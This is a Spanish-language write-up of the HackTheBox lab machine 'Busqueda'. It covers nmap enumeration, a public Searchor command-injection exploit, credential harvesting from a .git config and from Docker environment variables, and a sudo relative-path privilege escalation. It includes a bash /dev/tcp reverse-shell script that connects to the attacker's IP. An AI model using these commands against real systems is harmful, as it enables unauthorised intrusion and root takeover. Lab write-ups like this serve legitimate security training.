
---
title: "Busqueda"
summary: "Busqueda Machine From HackTheBox"
categories: ["Post","Blog",]
tags: ["post","lorem","ipsum"]
#externalUrl: ""
#showSummary: true
draft: false
date: 2024-12-18

---

| Información de la máquina | |
| -------------------- | ------------ |
| **Plataforma** | HackTheBox |
| **Sistema operativo** | Linux |
| **Dificultad** | Fácil |
| **IP** | 10.10.11.208 |
- - -
## Enumeración

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ nmap -p22,80 -sCV --min-rate 2000 -T5 -n -Pn 10.10.11.208 -oN ports

ESTADO DEL PUERTO VERSIÓN DEL SERVICIO
22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocolo 2.0)
| ssh-hostkey:
| 256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_ 256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)

80/tcp open http Apache httpd 2.4.52
|_http-title: No se siguió la redirección a http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Información del servicio: Host: searcher.htb; SO: Linux; CPE: cpe:/o:linux:linux_kernel
```

Podemos ver que la web en el puerto 80 redirige a **searcher.htb**. Vamos a agregarlo a `/etc/hosts`.

Tan pronto como aterrizamos en la página, vemos lo siguiente:
![Busqueda1](img/Busqueda/busqueda1.png)

Un vistazo rápido muestra la versión de la aplicación que se está ejecutando detrás de este sitio web, que es **Searchor 2.4.0**. Si buscamos vulnerabilidades, encontramos el siguiente [exploit](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)
- - -
## Explotación
Ejecutamos el exploit:
```bash
┌──(s3n㉿kali)-[~/Desktop/Box/exploitation]
└─$ ./exploit.sh http://searcher.htb/ 10.10.14.10 4646
```

Colocamos un listener `netcat` para recibir la conexión:
```bash
┌──(s3n㉿kali)-[~/Desktop/Box/exploitation]
└─$ nc -nlvp 4646
listening on [any] 4646 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.208] 40288
```

Ingresamos exitosamente a la máquina como usuario **svc** .
```bash
svc@busqueda:~$ cat usuario.txt
cat usuario.txt
75a17...8bd3e
```
- - -
## Escalada de privilegios
Al revisar los archivos del sistema, encontramos un `.git` con credenciales en la carpeta **app**.

```bash
svc@busqueda:/var/www/app/.git$ cat config

[core]
repositoryformatversion = 0
...
[remote "origin"]
url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
remote = origin
merge = refs/heads/main
```

El usuario es **cody** y la contraseña es **jh1usoih2bkjaspwe92** para una aplicación en un subdominio llamado **gitea**. Vamos a añadirlo al `/etc/hosts` y echarle un vistazo.

![Busqueda2](img/Busqueda/busqueda2.png)

Aquí dentro no encontramos nada interesante, salvo que podemos ver un usuario llamado **administrador**. Aunque podemos intentar usar SSH con el usuario **svc** y la contraseña de **cody**:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/exploitation]
└─$ ssh svc@10.10.11.208
Contraseña de svc@10.10.11.208:
Bienvenido a Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)

* Documentación: https://help.ubuntu.com
* Administración: https://landscape.canonical.com
* Soporte: https://ubuntu.com/advantage

...

Último inicio de sesión: mar abr 4 17:02:09 2023 desde 10.10.14.19
```

Comprobemos los privilegios de sudo que tiene este usuario:

```bash
svc@busqueda:/opt/scripts$ sudo -l

El usuario svc puede ejecutar los siguientes comandos en busqueda:
(root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Este usuario tiene derecho a ejecutar ese script dentro de **/opr/scripts**.

Si lo ejecutamos, podemos ver las siguientes opciones:

```bash
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Uso: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

docker-ps : Listar los contenedores de Docker en ejecución
docker-inspect : Inspeccionar un determinado contenedor de Docker
full-checkup : Ejecutar una comprobación completa del sistema
```

Después de investigar un poco, descubrimos que la opción `docker-inspect` se puede usar para recuperar información de los contenedores de Docker que se están ejecutando en la máquina, antes vista con la opción `docker-ps`.

```json
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq

"Env": [
"USER_UID=115",
"USER_GID=121",
"GITEA__database__DB_TYPE=mysql",
"GITEA__database__HOST=db:3306",
"GITEA__database__NAME=gitea",
"GITEA__database__USER=gitea",
"GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
"USER=git",
"GITEA_CUSTOM=/data/gitea"
],
```

Parece que encontramos más credenciales para la aplicación **gitea**. Intentemos iniciar sesión como **administrador**
con estas credenciales.

![Busqueda3](img/Busqueda/busqueda3.png)

¡Genial! Ahora podemos comprobar el contenido de los **scripts** en la carpeta **/opt**.

Al leer el script `system-checkup.py` notamos que el script `full-checkup.sh` es referenciado como si estuviera en la misma carpeta:

```
...
elif action == 'full-checkup':
try:
arg_list = ['./full-checkup.sh']
print(run_command(arg_list))
print('[+] Done!')
except:
print('Something went wrong')
exit(1)
...
```

Podemos abusar de esto creando nuestro propio script malicioso y referenciarlo, ya que lo estamos ejecutando con privilegios sudo:

```bash
svc@busqueda:/tmp$ cat full-checkup.sh

#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/10.10.14.12/4647 <&1'
```

>Ten en cuenta que debes otorgar privilegios de ejecución al script para que se ejecute, ya que este fue un error mío que me llevó bastante tiempo descubrir.

Ahora, configuramos un listener `netcat` y ejecutamos el script malicioso:

```bash
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

En el `netcat` recibimos el shell root:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/exploitation]
└─$ nc -nlvp 4647
listening on [any] 4647 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.208] 47020
root@busqueda:/tmp# whoami
root
```

¡Genial! Hemos rooteado la máquina.
```bash
root@busqueda:~# cat /root/root.txt
cat /root/root.txt
ccd03ae...0e87097
```